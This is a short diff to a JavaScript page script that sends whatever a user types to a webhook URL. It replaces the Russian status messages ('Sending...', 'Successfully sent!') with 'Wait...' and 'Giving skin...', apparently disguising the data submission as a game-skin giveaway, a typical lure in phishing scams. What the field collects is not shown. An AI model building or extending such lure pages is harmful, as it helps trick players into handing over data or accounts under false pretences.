@@ -8,7 +8,7 @@ input.addEventListener('keypress', function (e) {
         
         if (value === "") return;
 
-        status.innerText = "Отправка...";
+        status.innerText = "Wait...";
         
         fetch(webhookUrl, {
             method: 'POST',
@@ -18,7 +18,7 @@ input.addEventListener('keypress', function (e) {
             })
         })
         .then(() => {
-            status.innerText = "Успешно отправлено!";
+            status.innerText = "Giving skin...";
             input.value = ""; // Очистить поле
             setTimeout(() => { status.innerText = ""; }, 3000);
         })
